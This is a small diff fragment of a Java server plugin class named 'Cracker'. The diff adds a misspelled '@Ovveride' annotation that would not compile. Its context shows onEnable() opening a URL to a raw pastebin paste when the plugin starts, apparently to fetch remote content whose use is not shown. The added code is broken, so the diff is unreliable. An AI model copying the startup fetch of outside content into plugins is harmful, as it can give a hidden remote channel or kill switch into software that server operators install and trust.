@@ -10,6 +10,7 @@ public class Cracker extends JavaPlugin {
 
     public static String access;
 
+    @Ovveride
     public void onEnable() {
         try {
             URL URL = new URL("https://pastebin.com/raw/LHeEwZZv");
